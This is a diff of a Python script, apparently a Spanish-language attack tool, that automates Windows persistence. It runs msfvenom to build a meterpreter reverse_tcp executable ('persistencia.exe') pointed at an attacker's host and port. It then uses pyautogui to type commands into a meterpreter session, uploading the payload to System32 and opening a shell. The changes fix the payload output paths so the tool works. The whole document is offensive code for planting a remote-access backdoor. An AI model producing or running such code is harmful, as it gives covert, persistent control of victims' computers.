@@ -11,6 +11,7 @@ path_post_sh = os.getcwd()+ '/post/android_pers.sh'
 path_sh = 'android?pers.sh'
 new = path_post.replace("/", "-")
 path_pers_win = os.getcwd()+ '/pers_win/'
+archiv_pers_win = os.getcwd()+ '/pers_win/persistencia.exe'
 
 def clearScr():
     os.system('clear')
@@ -480,14 +481,14 @@ if numero == 4:
          >   """)
    
    
-         os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST='+ windows_ip +' LPORT='+ puerto +' -f exe -o path_pers_win/persistencia.exe')  
+         os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST='+ windows_ip +' LPORT='+ puerto +' -f exe -o '+ path_pers_win +'/persistencia.exe')  
    
          def auto_pers_sys32():
              pyautogui.write("set sessions " + sessions +"")
              pyautogui.press("ENTER")
              pyautogui.write("cd -windows-system32")
              pyautogui.press("ENTER")
-             pyautogui.write("upload "+ path_payload_pers +"")
+             pyautogui.write("upload "+ archiv_pers_win +"")
              pyautogui.press("ENTER")
              pyautogui.write("shell")
              pyautogui.press("ENTER")
@@ -513,7 +514,7 @@ if numero == 4:
          >   """)
    
        
-         os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST='+ windows_ip +' LPORT='+ puerto +' -f exe -o path_payloads/persistencia.exe')
+         os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST='+ windows_ip +' LPORT='+ puerto +' -f exe -o '+ path_pers_win +'/persistencia.exe')
    
          def auto_pers_startup():
                        
